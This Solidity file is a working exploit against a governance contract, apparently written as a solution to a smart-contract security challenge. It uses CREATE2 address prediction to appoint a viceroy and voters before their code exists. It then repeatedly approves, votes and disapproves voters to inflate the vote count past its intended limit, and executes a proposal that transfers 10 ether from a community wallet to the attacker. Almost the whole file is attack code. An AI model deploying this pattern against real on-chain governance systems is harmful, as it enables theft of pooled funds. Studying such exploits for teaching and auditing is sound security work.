// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

interface IGovernance {
    function createProposal(address, bytes calldata) external;
    function voteOnProposal(uint256, bool, address) external;
    function executeProposal(uint256) external;
    function appointViceroy(address, uint256) external;
    function approveVoter(address) external;
    function disapproveVoter(address) external;
    function proposals(uint256) external view returns (uint256 votes, bytes memory data);
}

contract GovernanceAttacker {
    using Create2Address for address;

    /**
     * Voting can be exploited because `disapproveVoter()` does not check whether the voter has
     * voted or not. That means, a voter can vote on a proposal, then viceroy can disapprove the voter
     * and add new a new voter leading to more votes than initially assigned (5).
     */
    function exploit(address governance) public {
        address viceroyAddress =
            address(this).predictAddress(bytes32(hex"1729"), type(ViceroyAsEOA).creationCode, abi.encode(governance));
        // Since viceroy.code.length == 0, appoint the viceroy first and then deploy the contract to it
        IGovernance(governance).appointViceroy(viceroyAddress, 1);
        // deploy contract at viceroyAddress address and then appoint voters inside its constructor
        new ViceroyAsEOA{salt: bytes32(hex"1729")}(IGovernance(governance));
    }

    receive() external payable {}
}

contract ViceroyAsEOA {
    using Create2Address for address;

    constructor(IGovernance governance) {
        // create a proposal to transfer ether by calling `exec` on CommunityWallet
        bytes memory proposalData = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
        uint256 proposalId = uint256(keccak256(proposalData));
        governance.createProposal(address(this), proposalData);

        for (uint256 i; i < 10; ++i) {
            address voterAddress = address(this).predictAddress(
                bytes32(uint256(i)), type(VoterAsEOA).creationCode, abi.encode(address(governance), proposalId)
            );

            // since voter.code.length == 0, appoint the voter first and then deploy the contract to it
            governance.approveVoter(voterAddress);

            // deploy voter and vote inside its constructor
            new VoterAsEOA{salt: bytes32(uint256(i))}(governance, proposalId);

            // disapprove voter
            governance.disapproveVoter(voterAddress);
        }

        // execute proposal
        governance.executeProposal(proposalId);
    }
}

contract VoterAsEOA {
    constructor(IGovernance governance, uint256 proposalId) {
        // vote on proposal
        governance.voteOnProposal(proposalId, true, msg.sender);
    }
}

library Create2Address {
    function predictAddress(address deployer, bytes32 salt, bytes memory creationCode, bytes memory encodedArgs)
        internal
        pure
        returns (address predictedAddress)
    {
        predictedAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff), deployer, salt, keccak256(abi.encodePacked(creationCode, encodedArgs))
                        )
                    )
                )
            )
        );
    }
}
